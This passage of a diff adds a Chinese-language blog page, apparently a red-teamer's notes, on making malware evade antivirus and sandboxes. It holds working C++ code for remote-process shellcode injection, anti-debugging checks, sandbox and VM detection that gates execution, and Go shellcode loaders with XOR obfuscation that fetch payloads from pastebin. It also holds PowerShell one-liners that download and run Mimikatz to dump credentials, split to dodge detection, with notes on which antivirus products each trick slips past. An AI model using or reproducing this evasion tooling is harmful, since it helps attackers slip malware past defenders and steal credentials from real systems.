+#include&lt;Windows.h&gt;
+
+int main()
+{
+  unsigned char buf[] = &quot;shellcode&quot;;
+  DWORD pid = 25388;
+  HANDLE Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+  if (!Proc) {
+    std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;
+  }
+  LPVOID buffer = VirtualAllocEx(Proc, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+  if (buffer) {
+    std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;
+  }
+  if (WriteProcessMemory(Proc, buffer, buf, sizeof(buf), 0) ){
+    std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;
+  }
+  HANDLE remotethread = CreateRemoteThread(Proc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);
+}
+</code></pre>
+<p>效果:虽然也很拉，但是静态过了趋势是我没想到的。</p>
+<p><img alt="QQ截图20210217145906" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217145906.png" title="QQ截图20210217145906" /></p>
+<h3 id="_7">反调试</h3>
+<p>可以通过反调试来规避杀软检测，拖慢逆向工程师分析速度，但也有可能提高被判为恶意文件的概率。</p>
+<h4 id="_8">直接判断是否为调试状态</h4>
+<pre><code class="language-纯文本">if (IsDebuggerPresent()) return FALSE;
+
+PPEB pPEB = (PPEB)__readgsqword(0x60);
+if (pPEB-&gt;BeingDebugged) return;
+
+BOOL ret;  
+CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  
+return ret;  
+</code></pre>
+<pre><code class="language-纯文本">NtQueryInformationProcess
+
+这个函数用来获取某进程的信息。
+需要动态链接库 #pragma comment(lib,&quot;ntdll&quot;)
+当然也可以用GetProcAddress动态获取这个函数。
+这个函数第一个参数指定进程句柄，第二个参数指定进程的特定结构，第三个参数获取返回值，第四个参数是返回值缓冲区大小，第五个填NULL
+其中与反调试有关的成员有ProcessDebugPort(0x7)、ProcessDebugObjectHandle(0x1E)和ProcessDebugFlags(0x1F)
+ProcessDebugPort参数，若没在调试中，则该函数返回0，若在调试中则返回对应的调试端口
+其他参数也类似
+
+看雪上houjingyi师傅的演示代码
+
+BOOL CheckDebug()  
+{  
+    int debugPort = 0;  
+    HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);  
+    NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  
+    NtQueryInformationProcess(GetCurrentProcess(), 0x7, &amp;debugPort, sizeof(debugPort), NULL);  
+    return debugPort != 0;  
+}  
+
+BOOL CheckDebug()  
+{  
+    HANDLE hdebugObject = NULL;  
+    HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);  
+    NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  
+    NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;hdebugObject, sizeof(hdebugObject), NULL);  
+    return hdebugObject != NULL;  
+}  
+
+BOOL CheckDebug()  
+{  
+    BOOL bdebugFlag = TRUE;  
+    HMODULE hModule = LoadLibrary(&quot;Ntdll.dll&quot;);  
+    NtQueryInformationProcessPtr NtQueryInformationProcess = (NtQueryInformationProcessPtr)GetProcAddress(hModule, &quot;NtQueryInformationProcess&quot;);  
+    NtQueryInformationProcess(GetCurrentProcess(), 0x1E, &amp;bdebugFlag, sizeof(bdebugFlag), NULL);  
+    return bdebugFlag != TRUE;  
+}  
+</code></pre>
+<h4 id="_9">检测软件断点</h4>
+<p>当我们在调试器中对一行代码打上断点时，实质上是将这行代码改为了0xcc，即INT 3，中断异常，所以调试器运行到此处时会停止。
+那么我们就可以通过检测代码中是否有0xcc来判断是否被打上了软件断点，从而起到反调试的作用。</p>
+<p>要做到这一点，可以使用汇编代码中的 repne scasb 指令，其第一个参数是缓冲区的起始地址，第二个参数是缓冲区大小，第三个参数是匹配的字符串。它会在指定的缓冲区内寻找字符串，若没有找到则返回.</p>
+<h4 id="_10">时间检测</h4>
+<pre><code class="language-纯文本">int t1 = GetTickCount64();
+Hack(); //一个函数，诱导分析人员在调试的时候跟进进去耽误时间
+int t2 = GetTickCount64();
+if (((t2 - t1) / 1000) &gt; 5) {
+return FALSE;
+}  //t1,t2检测时间过大则会是调试
+
+wprintf_s(L&quot;Now hacking more...\n&quot;);
+
+也可以用内联汇编完成
+BOOL CheckDebug()  
+{  
+    DWORD time1, time2;  
+    __asm  
+    {  
+        rdtsc  
+        mov time1, eax
+        ........垃圾代码，耽误分析人员时间
+        rdtsc  
+        mov time2, eax  
+    }  
+    if (time2 - time1 &lt; 0xff)  
+    {  
+        return FALSE;  
+    }  
+    else  
+    {  
+        return TRUE;  
+    }  
+}  
+</code></pre>
+<h4 id="_11">检测父进程</h4>
+<p>见沙箱绕过章节中的“检测父进程”</p>
+<h4 id="seh">SEH中断</h4>
+<p>不是很懂</p>
+<pre><code class="language-纯文本">void AD_BreakPoint()  
+{  
+    printf(&quot;SEH : BreakPoint\n&quot;);  
+
+    __asm {  
+        // install SEH  
+        push handler  
+        push DWORD ptr fs:[0]  
+        mov DWORD ptr fs:[0], esp  
+
+        // generating exception  
+        int 3  
+
+        // 1) debugging  
+        //    go to terminating code  
+        mov eax, 0xFFFFFFFF  
+        jmp eax                 // process terminating!!!  
+
+        // 2) not debugging  
+        //    go to normal code  
+handler:  
+        mov eax, dword ptr ss:[esp+0xc]  
+        mov ebx, normal_code  
+        mov dword ptr ds:[eax+0xb8], ebx  
+        xor eax, eax  
+        retn  
+
+normal_code:  
+        //   remove SEH  
+        pop dword ptr fs:[0]  
+        add esp, 4  
+    }  
+
+    printf(&quot;  =&gt; Not debugging...\n\n&quot;);  
+}  
+
+int _tmain(int argc, TCHAR* argv[])  
+{  
+    AD_BreakPoint();  
+
+    return 0;  
+}
+
+</code></pre>
+<h3 id="sandbox-evasion">沙箱绕过（Sandbox Evasion）</h3>
+<h4 id="system-checks">System Checks</h4>
+<p>检测当前环境是否是沙箱环境，如果是沙箱则不表现出恶意行为。</p>
+<h4 id="hook">检测函数是否被HOOK更改</h4>
+<p>有些沙箱会对一些函数进行HOOK更改，我们可以通过在原DLL中查找原函数与进程中的函数进行比对从而判断其是否被HOOK.
+这里是别人的代码(RedTeaming)</p>
+<pre><code class="language-纯文本">// manually load the dll
+HANDLE dllFile = CreateFileW(L&quot;C:\\Windows\\System32\\ntdll.dll&quot;, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+DWORD dllFileSize = GetFileSize(dllFile, NULL);
+HANDLE hDllFileMapping = CreateFileMappingW(dllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+HANDLE pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
+CloseHandle(dllFile);
+
+// analyze the dll
+PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllFileMappingBase;
+PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDllFileMappingBase + pDosHeader-&gt;e_lfanew);
+PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);
+PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pDllFileMappingBase + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+PULONG pAddressOfFunctions = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfFunctions);
+PULONG pAddressOfNames = (PULONG)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNames);
+PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)pDllFileMappingBase + pExportDirectory-&gt;AddressOfNameOrdinals);
+
+// find the original function code
+PVOID pNtCreateThreadExOriginal = NULL;
+for (int i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)
+{
+  PCSTR pFunctionName = (PSTR)((PBYTE)pDllFileMappingBase + pAddressOfNames[i]);
+  if (!strcmp(pFunctionName, &quot;NtCreateThreadEx&quot;))
+  {
+    pNtCreateThreadExOriginal = (PVOID)((PBYTE)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+    break;
+  }
+}
+
+// compare functions
+PVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleW(L&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);
+if (memcmp(pNtCreateThreadEx, pNtCreateThreadExOriginal, 16)) return false;
+</code></pre>
+<h4 id="gettickcount">GetTickCount</h4>
+<p>GetTickCount 是win32 API之一，用来记录电脑开机后的运行时间（以毫秒为单位）
+我们可以通过这个函数检测当前环境的运行时间，如果时间很短那么就有可能是沙箱。</p>
+<p>为什么时间很短就可能是沙箱环境呢？沙箱对恶意程序的检测流程大致如下</p>
+<pre><code class="language-纯文本">1.启动虚拟环境
+2.将恶意程序复制进虚拟环境
+3.运行恶意程序一段时间（一般为5分钟）
+4.获取虚拟环境返回的报告
+5.关机
+</code></pre>
+<p>全程不过6.7分钟，而正常的机器运行时间肯定是大于这个值的。那么我们就可以定一个标准：如果GetTickCount返回的值小于10min，那么就被判为沙箱环境。</p>
+<h4 id="cpuram">CPU,RAM等信息</h4>
+<p>沙箱的CPUI多为1核，ram多小于2g，硬盘大小多小于100g。我们可以以此为一个基准进行沙箱检测。</p>
+<pre><code class="language-纯文本">//cpu processors
+SYSTEM_INFO systeminfo;
+  GetSystemInfo(&amp;systeminfo);
+  DWORD numberOfProcessors = systeminfo.dwNumberOfProcessors;
+
+//ram
+  MEMORYSTATUSEX memoryStatus;
+  memoryStatus.dwLength = sizeof(memoryStatus);
+  GlobalMemoryStatusEx(&amp;memoryStatus);
+  DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
+
+//hdd(硬盘大小)
+  HANDLE hDevice = CreateFileW(L&quot;\\\\.\\PhysicalDrive0&quot;, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+  DISK_GEOMETRY pDiskGeometry;
+  DWORD bytesReturned;
+  DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL);
+  DWORD diskSizeGB;
+  diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
+
+  printf(&quot;cpu:%d,ram:%d,size(gb):%d&quot;, numberOfProcessors, RAMMB, diskSizeGB);
+</code></pre>
+<h4 id="mac">mac</h4>
+<p>常见虚拟机如vmware，viturl box等都有特殊的mac地址，可以以此为依据判断是否在虚拟机中（随着虚拟化主机越来越普遍，许多公司将业务系统也搬进了虚拟机，这个方法已不太能作为检测沙箱的指标）</p>
+<p>“通常，MAC地址的前三个字节标识一个提供商。以00:05:69、00:0c:29和00:50:56开始的MAC地址与VMware相对应；以00:03:ff开始的MAC地址与virtualpc对应；以08:00:27开始的MAC地址与virtualbox对应。”</p>
+<pre><code class="language-纯文本">
+
+  string mac;
+    get_3part_mac(mac);
+    if (mac == &quot;00-05-69&quot; || mac == &quot;00-0c-29&quot; || mac == &quot;00-50-56&quot; || mac == &quot;00-03-ff&quot; || mac == &quot;08-00-27&quot;) {
+
+    }
+    else {
+
+    }
+
+void get_3part_mac(string &amp;mac)  
+{  
+    NCB Ncb;  
+    ASTAT Adapter;  
+    UCHAR uRetCode;  
+    LANA_ENUM lenum;  
+    memset(&amp;Ncb, 0, sizeof(Ncb));  
+    Ncb.ncb_command = NCBENUM;  
+    Ncb.ncb_buffer = (UCHAR *)&amp;lenum;  
+    Ncb.ncb_length = sizeof(lenum);  
+    uRetCode = Netbios(&amp;Ncb);  
+    for (int i = 0; i &lt; lenum.length; i++)  
+    {  
+        memset(&amp;Ncb, 0, sizeof(Ncb));  
+        Ncb.ncb_command = NCBRESET;  
+        Ncb.ncb_lana_num = lenum.lana[i];  
+        uRetCode = Netbios(&amp;Ncb);  
+        memset(&amp;Ncb, 0, sizeof(Ncb));  
+        Ncb.ncb_command = NCBASTAT;  
+        Ncb.ncb_lana_num = lenum.lana[i];  
+        strcpy((char *)Ncb.ncb_callname, &quot;*&quot;);  
+        Ncb.ncb_buffer = (unsigned char *)&amp;Adapter;  
+        Ncb.ncb_length = sizeof(Adapter);  
+        uRetCode = Netbios(&amp;Ncb);  
+        if (uRetCode == 0)  
+        {  
+            char tmp[128];  
+            sprintf(tmp, &quot;%02x-%02x-%02x&quot;,  
+                Adapter.adapt.adapter_address[0],  
+                Adapter.adapt.adapter_address[1],  
+                Adapter.adapt.adapter_address[2]  
+            );  
+            mac = tmp;  
+        }  
+    }  
+}  
+</code></pre>
+<h4 id="_12">分辨率</h4>
+<p>沙箱的分辨率都不太正常</p>
+<h4 id="_13">检查时区与时间流动性</h4>
+<p>沙箱往往会加速运行文件，故可以检查时间流动性是否正常从而检测沙箱</p>
+<pre><code class="language-纯文本">    //时区
+    DYNAMIC_TIME_ZONE_INFORMATION DynamicTimeZoneInfo;
+    GetDynamicTimeZoneInformation(&amp;DynamicTimeZoneInfo);
+    wchar_t wcTimeZoneName[128 + 1];
+    StringCchCopyW(wcTimeZoneName, 128, DynamicTimeZoneInfo.TimeZoneKeyName);
+    CharUpperW(wcTimeZoneName);
+    if (!wcsstr(wcTimeZoneName, L&quot;CHINA STANDARD TIME&quot;)) {
+
+    }
+
+    //流动性
+    clock_t ClockStartTime, ClockEndTime;
+    time_t UnixStartTime = time(0);
+    ClockStartTime = clock();
+    Sleep(10000);
+    ClockEndTime = clock();
+    time_t UnixEndTime = time(0);
+    int iTimeDifference = ((UnixEndTime - UnixStartTime) * 1000) - (ClockEndTime - ClockStartTime);
+    if (iTimeDifference&gt;150){
+//*code
+    }
+</code></pre>
+<h4 id="_14">检测文件名是否被沙箱更改</h4>
+<pre><code class="language-纯文本">wchar_t currentProcessPath[MAX_PATH + 1];
+GetModuleFileNameW(NULL, currentProcessPath, MAX_PATH + 1);
+CharUpperW(currentProcessPath);
+if (!wcsstr(currentProcessPath, L&quot;evil.EXE&quot;)) return false;
+</code></pre>
+<h4 id="time-based-evasion">Time-Based Evasion</h4>
+<p>基于时间的规避。即恶意软件在目标系统上运行后并不会立刻进行恶意行动，而是会伪装、休眠一段时间，等到一定时间后再开始恶意行动</p>
+<h4 id="_15">使用网络连接实时读取启动指令</h4>
+<p>意思就是说该程序会不断向某个网址发送请求包，如果网址返回了对应的启动指令则开始调用恶意代码。</p>
+<p>下图是用HTTP请求获取网页内容的代码。</p>
+<pre><code class="language-纯文本">  HINTERNET hSession = WinHttpOpen(L&quot;Mozilla 5.0&quot;, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+  HINTERNET hConnection = WinHttpConnect(hSession, L&quot;www.baidu.com&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);
+  HINTERNET hRequest = WinHttpOpenRequest(hConnection, L&quot;GET&quot;, L&quot;&quot;, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
+  WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+  WinHttpReceiveResponse(hRequest, 0);
+  DWORD responseLength;
+  WinHttpQueryDataAvailable(hRequest, &amp;responseLength);
+  PVOID response = new char[responseLength + 1];
+  WinHttpReadData(hRequest, response, responseLength, &amp;responseLength);
+  std::cout &lt;&lt; ((char *)response);
+</code></pre>
+<h4 id="user-activity-based-checks">User Activity Based Checks</h4>
+<p>通过检测一些行为，来识别当前实施者是否为人类。（比如动鼠标，敲键盘等，或者查询电脑上word文档打开历史数，chrome历史记录等信息来判断）</p>
+<h4 id="_16">鼠标移动轨迹</h4>
+<p>可以设置鼠标移动多少距离才执行shellcode，沙箱有些是没有鼠标的。</p>
+<pre><code class="language-纯文本">POINT CurrentMousePos;
+    POINT PreviousMousePos;
+    GetCursorPos(&amp;PreviousMousePos);
+    double Dis = 0;
+    while (true)
+    {
+        GetCursorPos(&amp;CurrentMousePos);
+        Dis+= sqrt(pow(CurrentMousePos.x - PreviousMousePos.x, 2) + pow(CurrentMousePos.y - PreviousMousePos.y, 2));
+        Sleep(100);
+        if (Dis &gt; 20000) {
+//*code
+        }
+
+    }
+</code></pre>
+<h4 id="_17">检测父进程</h4>
+<p>对于一个正常的用户来说，启动exe文件应该是双击运行，程序启动后父进程是explore.exe，如果是cmd运行则会是cmd.exe、
+但是对于沙箱就有可能存在用一个程序如windbg来启动我们的恶意EXE文件，这个时候我们就需要对此点进行检测。</p>
+<pre><code class="language-纯文本">DWORD GetParentPID(DWORD pid)
+{
+  DWORD ppid = 0;
+  PROCESSENTRY32W processEntry = { 0 };
+  processEntry.dwSize = sizeof(PROCESSENTRY32W);
+  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  //对所有进程创建快照
+  if (Process32FirstW(hSnapshot, &amp;processEntry))  //遍历快照，找到当前传入PID的进程信息
+  {
+    do
+    {
+      if (processEntry.th32ProcessID == pid)
+      {
+        ppid = processEntry.th32ParentProcessID;  //找到并返回传入PID的父进程PID
+        break;
+      }
+    } while (Process32NextW(hSnapshot, &amp;processEntry));
+  }
+  CloseHandle(hSnapshot);
+  return ppid;
+}
+
+void main()
+{
+  DWORD parentPid = GetParentPID(GetCurrentProcessId()); //获取当前进程父进程PID
+  WCHAR parentName[MAX_PATH + 1];
+  DWORD dwParentName = MAX_PATH;
+  HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);  //打开父进程
+  QueryFullProcessImageNameW(hParent, 0, parentName, &amp;dwParentName); // another way to get process name is to use 'Toolhelp32Snapshot' //获取进程名
+  CharUpperW(parentName);
+  if (wcsstr(parentName, L&quot;WINDBG.EXE&quot;)) return; //匹配
+
+  wprintf_s(L&quot;Now hacking...\n&quot;);
+}
+</code></pre>
+<h3 id="_18">进程镂空</h3>
+<h3 id="api">动态调用API</h3>
+<pre><code class="language-纯文本">  typedef LPVOID(WINAPI* ImportVirtualAlloc)(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flAllocationType,
+    DWORD  flProtect
+    );
+  unsigned char buf[] = &quot;shellcode&quot;;
+  ImportVirtualAlloc a = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(&quot;kernel32.dll&quot;)), &quot;VirtualAlloc&quot;);
+  a(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</code></pre>
+<h1 id="powershell">Powershell</h1>
+<h3 id="_19">远程执行与本地执行</h3>
+<h4 id="_20">远程执行</h4>
+<p>powershell可以加载远程的ps1文件。这样做的好处是实现了无文件落地。</p>
+<pre><code class="language-纯文本">powershell &quot;IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds&quot;
+</code></pre>
+<p>不过市面上很多杀软对downloadstring检测十分十分严格(许多会检测远程文件安全性）</p>
+<pre><code class="language-纯文本">powershell -exec bypass -f \\webdavserver\folder\payload.ps1 (smb)
+</code></pre>
+<h4 id="_21">本地执行</h4>
+<pre><code class="language-纯文本">powershell Import-Module .\xx.ps1
+</code></pre>
+<h3 id="_22">命令拆分</h3>
+<p>就像刚刚远程加载的downloadstring法，它很容易被杀软拦截。但是我们可以通过拆分重组绕过一些杀软检测。</p>
+<pre><code class="language-纯文本">powershell -c &quot;$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://webserver/xxx.ps1'')'.Replace('123','adString');IEX ($c1+$c2)&quot;
+</code></pre>
+<h1 id="go">GO</h1>
+<h2 id="funny">FUNNY</h2>
+<p>很有趣的一件事是，用go语言写个helloworld传到vt被14家杀,牛批</p>
+<p><img alt="image-20210819215802696" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210819215802696.png" title="image-20210819215802696" /></p>
+<h2 id="exe_2">生成EXE</h2>
+<p>go 编译为EXE 的做法是<strong>go build</strong> ....go，但这样EXE打开时会有个黑框</p>
+<p>go build -ldflags "-H windowsgui" ..go  生成无窗口EXE，但这样会增加杀软的查杀度</p>
+<h2 id="shellcode_9">申请内存加载shellcode</h2>
+<pre><code class="language-纯文本">package main
+
+import (
+&quot;syscall&quot;
+&quot;unsafe&quot;
+)
+
+const (
+  MEM_COMMIT             = 0x1000
+  MEM_RESERVE            = 0x2000
+  PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
+  KEY_1                  = 55
+  KEY_2                  = 66
+)
+
+var (
+  kernel32      = syscall.MustLoadDLL(&quot;kernel32.dll&quot;)
+  ntdll         = syscall.MustLoadDLL(&quot;ntdll.dll&quot;)
+  VirtualAlloc  = kernel32.MustFindProc(&quot;VirtualAlloc&quot;)
+  RtlCopyMemory = ntdll.MustFindProc(&quot;RtlCopyMemory&quot;)
+)
+
+func main(){
+  shellcode:=[]byte{0xfc,...,0x30,0x00,0x19,0x69,0xa0,0x8d}
+  addr,_,err:=VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE )
+  if err != nil &amp;&amp; err.Error() != &quot;The operation completed successfully.&quot; {
+    syscall.Exit(0)
+  }
+  _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))
+  if err != nil &amp;&amp; err.Error() != &quot;The operation completed successfully.&quot; {
+    syscall.Exit(0)
+  }
+  syscall.Syscall(addr, 0, 0, 0, 0)
+}
+</code></pre>
+<p>最原始版本,被杀成哈批，但即使这样360也杀不出来，可以看出绕过360有手就行</p>
+<p><img alt="image-20210818180146046" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818180146046.png" title="image-20210818180146046" /></p>
+<h2 id="xor">简单XOR</h2>
+<pre><code class="language-纯文本">xor模块（获得xor后的shellcode）
+  for i:=0;i&lt;len(shellcode);i++{
+    fmt.Print(&quot;0x&quot;,strconv.FormatInt(int64(shellcode[i]^123),16),&quot;,&quot;)
+  }
+</code></pre>
+<pre><code class="language-纯文本">  xor_shellcode:=[]byte{xored_shellcode}
+  var shellcode []byte
+  for i:=0;i&lt;len(xor_shellcode);i++{
+    shellcode=append(shellcode,xor_shellcode[i]^123)
+  }
+  addr,_,err:=VirtualAlloc.Call(0,uintptr(len(shellcode)),MEM_COMMIT, PAGE_EXECUTE_READWRITE )
+  if err != nil &amp;&amp; err.Error() != &quot;The operation completed successfully.&quot; {
+    syscall.Exit(0)
+  }
+  _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;shellcode[0])), uintptr(len(shellcode)))
+  if err != nil &amp;&amp; err.Error() != &quot;The operation completed successfully.&quot; {
+    syscall.Exit(0)
+  }
+  syscall.Syscall(addr, 0, 0, 0, 0)
+</code></pre>
+<p><img alt="image-20210818185018219" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818185018219.png" title="image-20210818185018219" /></p>
+<p>好了点，但是如果加上无框启动，还是会被杀成哈批</p>
+<h2 id="_23">沙盒&amp;虚拟机检测</h2>
+<pre><code class="language-纯文本">imoprt{  &quot;github.com/shirou/gopsutil/host&quot;
+  &quot;github.com/shirou/gopsutil/mem&quot;
+  &quot;github.com/shirou/gopsutil/disk&quot;
+  }
+
+func CheckTime() bool{
+  timeBoot, _ := host.BootTime()
+  t := time.Unix(int64(timeBoot), 0)
+  timeNow:=time.Now()
+  ts:=timeNow.Sub(t)
+  if ts.Minutes()&lt;12{
+    return false
+  }else{
+    return true
+  }
+}
+
+func CheckName() bool{
+  files, _ := ioutil.ReadDir(&quot;./&quot;)
+  for _, f := range files {
+    if f.Name()==&quot;ActiveX.exe&quot;{
+      return true
+    }
+  }
+  return false
+}
+
+func CheckSystem() bool{
+  info1,_:=mem.SwapMemory()
+  info2,_:=mem.VirtualMemory()
+  disk,_:=disk.Usage(&quot;c:&quot;)
+  if(runtime.NumCPU()&lt;2&amp;&amp;info1.Total&lt;2147483648&amp;&amp;info2.Total&lt;2147483648&amp;&amp;disk.Total&lt;21474836480){
+    return false
+  }
+  return true
+}
+
+</code></pre>
+<p><img alt="image-20210818192335970" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818192335970.png" title="image-20210818192335970" /></p>
+<p>用它和XOR打组合拳效果将就，用了无窗启动后有7个查出来</p>
+<h3 id="_24">虚拟机：敏感文件检测</h3>
+<p>这个会被defender拦，不必要的话不用这个</p>
+<pre><code class="language-纯文本">func PathExists(path string) (bool, error) { //判断文件是否存在
+  _, err := os.Stat(path)
+  if err == nil {
+    return true, nil
+  }
+  if os.IsNotExist(err) {
+    return false, nil
+  }
+  return false, err
+}
+func fack(path string) { //判断虚拟机关键文件是否存在
+  b, _ := PathExists(path)
+  if b {
+    fmt.Printf(&quot;当前是虚拟机环境，别分析了，哥。&quot;)
+    os.Exit(1) //如果是虚拟机就退出当前进程
+  }
+}
+func check() {
+  fack(&quot;C:\\windows\\System32\\Drivers\\Vmmouse.sys&quot;)
+  fack(&quot;C:\\windows\\System32\\Drivers\\vmtray.dll&quot;)
+  fack(&quot;C:\\windows\\System32\\Drivers\\VMToolsHook.dll&quot;)
+  fack(&quot;C:\\windows\\System32\\Drivers\\vmmousever.dll&quot;)
+  fack(&quot;C:\\windows\\System32\\Drivers\\vmhgfs.dll&quot;)
+  fack(&quot;C:\\windows\\System32\\Drivers\\vmGuestLib.dll&quot;)
+  fack(&quot;C:\\windows\\System32\\Drivers\\VBoxMouse.sys&quot;)
+  fack(&quot;C:\\windows\\System32\\Drivers\\VBoxGuest.sys&quot;)
+  fack(&quot;C:\\windows\\System32\\Drivers\\VBoxSF.sys&quot;)
+  fack(&quot;C:\\windows\\System32\\Drivers\\VBoxVideo.sys&quot;)
+  fack(&quot;C:\\windows\\System32\\vboxdisp.dll&quot;)
+  fack(&quot;C:\\windows\\System32\\vboxhook.dll&quot;)
+  fack(&quot;C:\\windows\\System32\\vboxoglerrorspu.dll&quot;)
+  fack(&quot;C:\\windows\\System32\\vboxoglpassthroughspu.dll&quot;)
+  fack(&quot;C:\\windows\\System32\\vboxservice.exe&quot;)
+  fack(&quot;C:\\windows\\System32\\vboxtray.exe&quot;)
+  fack(&quot;C:\\windows\\System32\\VBoxControl.exe&quot;)
+}
+</code></pre>
+<h2 id="shellcode_10">远程读shellcode</h2>
+<pre><code class="language-纯文本">  Url,err:=url.Parse(&quot;https://pastebin.com/aa&quot;)
+  if err!=nil{
+    panic(&quot;error&quot;)
+  }
+  client:=http.Client{}
+  req,_:=http.NewRequest(&quot;GET&quot;,Url.String(),nil)
+  req.Header.Add(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;)
+  req.Header.Add(&quot;Cookie&quot;,&quot;SUB=_2 SUBP=00&quot;)
+  resp,_:=client.Do(req)
+  body,_:=ioutil.ReadAll(resp.Body)  //string形式获取了页面内容,以上代码为主体部分
+
+  //通过一系列正则匹配,字符串截取等方法从页面中得到shellcode(页面中我的shellcode是这样的rngrngfc,48,....,aalgdlgd)
+  re:=regexp.MustCompile(`rngrng.*lgdlgd`)
+  match:=re.FindString(string(body))
+  match=match[6:len(match)-6]
+  return match
+</code></pre>
+<p>但是拖下来的shellcode是string格式，我们需要把他转为[]byte</p>
+<pre><code class="language-纯文本">func aa(encodes string) []byte{
+  var xor_shellcode []byte
+  spi:=&quot;,&quot;
+  enc:=strings.Split(encodes,spi)
+
+
+  for i,_ :=range enc{
+    tmps,_:=hex.DecodeString(enc[i])
+    if(len(tmps)&gt;0) {
+      xor_shellcode = append(xor_shellcode, tmps[0])
+    }
+  }
+  return xor_shellcode
+}
+</code></pre>
+<p>远程+XOR+沙箱 反而被杀的更多...看来这个HTTP函数被抓的很紧，还被360杀出来了</p>
+<p><img alt="image-20210818233352655" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210818233352655.png" title="image-20210818233352655" /></p>
+<h2 id="shellcode_11">读取文件中的SHELLCODE</h2>
+<pre><code class="language-纯文本">    var sc []byte
+    bytes,_:=ioutil.ReadFile(&quot;C:\\Users\\xx\\Desktop\\sc.txt&quot;)
+    tmp:=strings.Split(string(bytes),&quot;,&quot;)
+    for i,_ :=range tmp{
+      tmps,_:=hex.DecodeString(tmp[i])
+      if(len(tmps)&gt;0) {
+        sc = append(sc, tmps[0])
+      }
+    }
+</code></pre>
+<p><img alt="image-20210819212634402" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210819212634402.png" title="image-20210819212634402" /></p>
+<p>可以</p>
+<h2 id="_25">文件释放</h2>
+<p>在我们木马运行时可以释放一个正常文件并运行，达到DLL劫持或者迷惑视听的作用。</p>
+<pre><code class="language-纯文本">获取文件内容
+  file,_:=os.Open(&quot;E:\\tools\\shell\\cobaltstrike4.3\\cobaltstrike.exe&quot;)
+  fi,_:=file.Stat()
+  size:=fi.Size()
+  data := make([]byte, size)
+  file.Read(data)
